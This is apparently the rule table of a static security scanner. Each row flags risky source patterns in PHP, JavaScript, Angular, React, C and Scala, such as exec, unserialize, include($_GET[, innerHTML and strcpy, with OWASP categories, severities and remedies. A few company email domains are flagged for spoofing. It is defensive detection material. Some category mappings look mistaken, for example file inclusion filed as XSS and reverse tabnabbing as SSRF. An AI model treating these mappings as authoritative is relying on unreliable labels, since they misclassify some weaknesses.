50;Language;PHP;mysql_query;mysql_query;Investigate;Language_PHP_Investigate_mysql_query;False;;True;False;True;;;SQL Injection;A3-Injection;High;;;https://github.com/FloeDesignTechnologies/phpcs-security-audit;
50;Language;PHP;exec;exec_2;Investigate;Language_PHP_Investigate_exec_2;False;;True;False;True;;;Remote code execution;A3-Injection;High;;;https://github.com/FloeDesignTechnologies/phpcs-security-audit;
50;Language;PHP;"header(""Location:";header_location;Insecure;Language_PHP_Insecure_header_location;False;;True;False;True;;;Open redirect;A3-Injection;High;Redirects to what location?;URL whitelisting;;
50;Language;PHP;include($_GET[;include_get;Investigate;Language_PHP_Investigate_include_get;False;;True;False;True;;;XSS;A3-Injection;High;;"include('./includes/somefile.php');";;
50;Language;PHP;libxml_disable_entity_loader(false;libxml_disable_entity_loader_false;Insecure;Language_PHP_Insecure_libxml_disable_entity_loader_false;False;;True;False;True;;;XXE;A5-Security Misconfiguration;High;;Should be true;https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet;
50;Language;PHP;unserialize(;unserialize;Investigate;Language_PHP_Investigate_unserialize;False;;True;False;True;;;Input validation;A8-Software and Data Integrity Failures ;High;Deserialization vulnerability;Use safe interchange format like JSON;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;
50;Language;PHP;phpinfo;phpinfo;Investigate;Language_PHP_Investigate_phpinfo;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;;;https://github.com/FloeDesignTechnologies/phpcs-security-audit;
50;Language;PHP;fread;fread;Investigate;Language_PHP_Investigate_fread;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Medium;;;https://github.com/FloeDesignTechnologies/phpcs-security-audit;
60;Language;JavaScript;*CF_SCRIPT(ONLOAD);onload;Investigate;Language_JavaScript_Investigate_onload;False;;True;False;True;;;XSS;A3-Injection;High;Search for malicious code. ;;;
60;Language;JavaScript;expression;expression;Investigate;Language_JavaScript_Investigate_expression;False;;True;False;True;;;XSS;A3-Injection;High;Search for malicious code. ;;;
60;Language;JavaScript;*CF_SCRIPT(SRC);src;Investigate;Language_JavaScript_Investigate_src;False;;True;False;True;;;XSS;A3-Injection;High;Search for malicious code. ;;;
60;Language;JavaScript;jwt.decode(;jwt_decode;Investigate;Language_JavaScript_Investigate_jwt_decode;False;;True;False;True;Locate;;Security misconfiguration;A7-Identification and Authentication Failures;High;Jwt.decode() does not verify the signature.; Use jwt.verify() instead.;https://www.netsparker.com/blog/web-security/json-web-token-jwt-attacks-vulnerabilities/;
60;Language;JavaScript;storage;storage;Investigate;Language_JavaScript_Investigate_storage;False;;True;False;True;Locate;;XSS;A3-Injection;High;Local and - less easily- Sessionstorage can be read by an attacker.;Encrypt sensitive data. E.g. Using npm encrypt-storage.;https://blog.bitsrc.io/sessionstorage-and-localstorage-a-ux-security-comparison-a05c486413e0;
60;Language;JavaScript;InnerHTML;InnerHTML;Investigate;Language_JavaScript_Investigate_InnerHTML;False;;True;False;True;;;XSS;A3-Injection;High;;;;
60;Language;JavaScript;${param.;query_parameter;Investigate;Language_JavaScript_Investigate_query_parameter;False;;True;False;True;;;XSS;A3-Injection;High;Check if query parameters are validated/sanitized;;https://www.developer.com/java/other/article.php/883381/jsp-security.htm;
60;Language;JavaScript;setInterval(;setInterval;Investigate;Language_JavaScript_Investigate_setInterval;False;;True;False;True;;;DoS;A4-Insecure Design;Low;;clearInterval;https://reliablejavascript.com/2017/11/05/how-timer-intervals-can-leak-memory/;
60;Language;JavaScript;document.cookie;document_cookie;Investigate;Language_JavaScript_Investigate_document_cookie;False;;True;False;True;;;Authentication;A7-Identification and Authentication Failures;Medium;Should normally be set to httpOnly and Secure;;;
60;Language;JavaScript;console.log;console_log;Investigate;Language_JavaScript_Investigate_console_log;False;;True;False;True;;;Sensitive data exposure;A9-Security Logging and Monitoring Failures;Low;Privacy may be violated. The disclosure of session ID's may enable an attacker to take over user sessions.;Encrypt sensitive information or implement environment dependent logging of  sensitive information, ensure it is turned off by default.;;
60;Language;JavaScript;window.open(;window_open;Insecure;Language_JavaScript_Insecure_window_open;False;;True;False;True;Locate;;Phishing;A10-Server-Side Request Forgery (SSRF);Low;window.open vulnerability, without setting myNwWdw.opener = null afterwards.;myNwWdw.opener = null afterwards;https://www.owasp.org/index.php/Reverse_Tabnabbing;https://www.jitbit.com/alexblog/256-targetblank---the-most-underestimated-vulnerability-ever/
60;Language;JavaScript;window.location;window_location;Investigate;Language_JavaScript_Investigate_window_location;False;;True;False;True;;AssignedTo;XSS;A3-Injection;Medium;Avoid user-coontrolled data to be dynamically written to the HTML document.;Use e.g. encodeURI();;
60;Language;JavaScript;_blank;_blank;Insecure;Language_JavaScript_Insecure__blank;False;;True;False;True;;;Phishing;A10-Server-Side Request Forgery (SSRF);Low;"window.open vulnerability, when using target=""_blank"" without rel=""noopener noreferrer""";"rel=""noopener noreferrer""";https://www.owasp.org/index.php/Reverse_Tabnabbing;https://mathiasbynens.github.io/rel-noopener/
70;Language;AngularJS;bypassSecurityTrust;bypassSecurityTrust;Investigate;Language_AngularJS_Investigate_bypassSecurityTrust;False;;True;False;True;;;XSS;A3-Injection;Medium;Circumvents  Angular XSS protection.;;https://angular.io/guide/security;
70;Language;AngularJS;$sce;$sce;Investigate;Language_AngularJS_Investigate_$sce;False;;True;False;True;;;XSS;A3-Injection;Medium;"sce = Angular's Strict Contextual Auto Escaping. Circumvents Angular XSS protection when specifying ""$sce.enabled(false)"".";"Use ""ng-bind-html=…"" in the view and import ""ngSanitize"" in the angular.module.";https://owasp.org/www-pdf-archive/Benelus_day_20161125_S_Lekies_Securing_AngularJS_Applications.pdf;
70;Language;AngularJS;.html(;element_html;Investigate;Language_AngularJS_Investigate_element_html;False;;True;False;True;;;XSS;A3-Injection;Medium;"""angular.element(…).html(userInput)"". jqLite api's circumvent Angular XSS auto-escape protection.";"Use ""ng-bind-html=…"" in the view and import ""ngSanitize"" in the angular.module.";https://owasp.org/www-pdf-archive/Benelus_day_20161125_S_Lekies_Securing_AngularJS_Applications.pdf;
70;Language;AngularJS;.trustAsHtml(;trustAsHtml;Investigate;Language_AngularJS_Investigate_trustAsHtml;False;;True;False;True;;;XSS;A3-Injection;Medium;"""$sce.trustAsHtml(userInput)"" circumvents Angular XSS auto-escape protection.";"Use ""ng-bind-html=…"" in the view and import ""ngSanitize"" in the angular.module.";https://owasp.org/www-pdf-archive/Benelus_day_20161125_S_Lekies_Securing_AngularJS_Applications.pdf;
70;Language;AngularJS;escapeForHtml;escapeForHtml;Investigate;Language_AngularJS_Investigate_escapeForHtml;False;;True;False;True;;;XSS;A3-Injection;Medium;"""escapeForHtml(userInput)"". This is a DIY that may circumvents Angular XSS auto-escape protection.";"Use ""ng-bind-html=…"" in the view and import ""ngSanitize"" in the angular.module.";https://owasp.org/www-pdf-archive/Benelus_day_20161125_S_Lekies_Securing_AngularJS_Applications.pdf;
70;Language;AngularJS;$interval;interval;Investigate;Language_AngularJS_Investigate_interval;False;;True;False;True;;;DoS;A4-Insecure Design;Low;;$interval.cancel(;https://docs.angularjs.org/api/ng/service/$interval;
80;Language;React;createElement;createElement;Investigate;Language_React_Investigate_createElement;False;;True;False;True;;;XSS;A3-Injection;High;;React version 0.14.0 or higher;https://snyk.io/vuln/npm:react:20150318;
80;Language;React;stringify;stringify;Investigate;Language_React_Investigate_stringify;False;;True;False;True;;;XSS;A3-Injection;High;;serialize;https://medium.com/node-security/the-most-common-xss-vulnerability-in-react-js-applications-2bdffbcc1fa0;
80;Language;React;dangerouslySetInnerHTML;dangerouslySetInnerHTML;Investigate;Language_React_Investigate_dangerouslySetInnerHTML;False;;True;False;True;;;XSS;A3-Injection;High;;;https://reactjs.org/docs/dom-elements.html;
80;Language;React;navigation.navigate(;navigation;Investigate;Language_React_Investigate_navigation;False;;True;False;True;;;Authentication;A7-Identification and Authentication Failures;High;Circumvents  React auth_flow.;;https://reactnavigation.org/docs/auth-flow/;
85;Language;HTML;*CF_INPUT(<input);input;Investigate;Language_HTML_Investigate_input;False;;True;False;True;;;Input validation;A3-Injection;High;;;;
90;Language;C;strcpy;strcpy;Insecure;Language_C_Insecure_strcpy;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned;strcpy_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;strcat;strcat;Insecure;Language_C_Insecure_strcat;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned;strcat_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;strncpy;strncpy;Insecure;Language_C_Insecure_strncpy;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned;strcpy_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;strncat;strncat;Insecure;Language_C_Insecure_strncat;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned;strcat_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;strtok;strtok;Insecure;Language_C_Insecure_strtok;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned;strtok_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;makepath;makepath;Insecure;Language_C_Insecure_makepath;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned;_makepath_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;stok;stok;Insecure;Language_C_Insecure_stok;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: _wcstok, ;strtok_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;scanf;scanf;Insecure;Language_C_Insecure_scanf;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned;sscanf_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;_itoa;_itoa;Insecure;Language_C_Insecure__itoa;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned;_itoa_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;isBad;isBad;Insecure;Language_C_Insecure_isBad;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: IsBadWritePtr, IsBadHugeWritePtr, IsBadReadPtr, IsBadHugeReadPtr, IsBadCodePtr, IsBadStringPtr. As bad as catching all exceptions.;Rewrite code;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;alloca;alloca;Insecure;Language_C_Insecure_alloca;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned;Rewrite code;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;CharToOem;CharToOem;Insecure;Language_C_Insecure_CharToOem;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: CharToOem, CharToOemA, CharToOemW, CharToOemBuffA, CharToOemBuffW;Rewrite code;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;gett;gett;Insecure;Language_C_Insecure_gett;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: _getts, _gettws;gets_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;gets;gets;Insecure;Language_C_Insecure_gets;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: gets;gets_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;OemToChar;OemToChar;Insecure;Language_C_Insecure_OemToChar;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: OemToChar, OemToCharA, OemToCharW;Rewrite code;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;strlen;strlen;Insecure;Language_C_Insecure_strlen;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;"banned; strlen, _mbstrlen,  lstrlen";strlen_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;i64;i64;Insecure;Language_C_Insecure_i64;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: _i64toa, _i64tow, _ui64toa, _ui64tot, _ui64tow;_itoa_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;slen;slen;Insecure;Language_C_Insecure_slen;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: wcslen, _mbslen;strlen_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;memcpy;memcpy;Insecure;Language_C_Insecure_memcpy;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: memcpy, wmemcpyn;memcpy_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;C;CopyMemory;CopyMemory;Insecure;Language_C_Insecure_CopyMemory;False;;True;False;True;;;Buffer overflow;A6-Vulnerable and Outdated Components;High;banned: RtlCopyMemory, CopyMemory;memcpy_s;https://msdn.microsoft.com/en-us/library/bb288454.aspx;
90;Language;Scala;SAXParserFactory;SAXParserFactory;Insecure;Language_Scala_Insecure_SAXParserFactory;False;;True;False;True;;;XXE;A5-Security Misconfiguration;Medium;;"Generally, disable DTD (External Entities). E.g. via ""SaxParserFactory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)"" or ""SaxParserFactory.setFeature(""http://apache.org/xml/features/disallow-doctype-decl"", true);""";https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet;https://blog.codacy.com/8-more-scala-security-issues-you-should-know-about/
50;Language;Scala;deserializeObject(;deserializeObject;Investigate;Language_Scala_Investigate_deserializeObject;False;;True;False;True;;;Input validation;A8-Software and Data Integrity Failures ;High;Deserialization vulnerability;Avoid deserializing objects provided by end users.;https://www.owasp.org/index.php/Deserialization_Cheat_Sheet;https://blog.codacy.com/9-scala-security-issues/
50;Language;Scala;NullCipher;NullCipher;Investigate;Language_Scala_Investigate_NullCipher;False;;True;False;True;;;Cryptography;A2-Cryptographic Failures;High;NullCipher returns the plain tekst.;Avoid  using NullCipher (in production).;https://blog.codacy.com/9-scala-security-issues/;
500;Company;KPN;@kpn.com;mail_kpn;Investigate;Company_KPN_Investigate_mail_kpn;False;;True;False;True;;;Authentication and authorisation;A7-Identification and Authentication Failures;Medium;Email spoofing?;;;
500;Company;ilionx;@ilionx.com;mail_ilionx;Investigate;Company_ilionx_Investigate_mail_ilionx;False;;True;False;True;;;Authentication and authorisation;A7-Identification and Authentication Failures;Medium;Email spoofing?;;;
500;Company;Lyanthe;@lyanthe.com;mail_lyanthe;Investigate;Company_Lyanthe_Investigate_mail_lyanthe;False;;True;False;True;;;Authentication and authorisation;A7-Identification and Authentication Failures;Medium;Email spoofing?;;;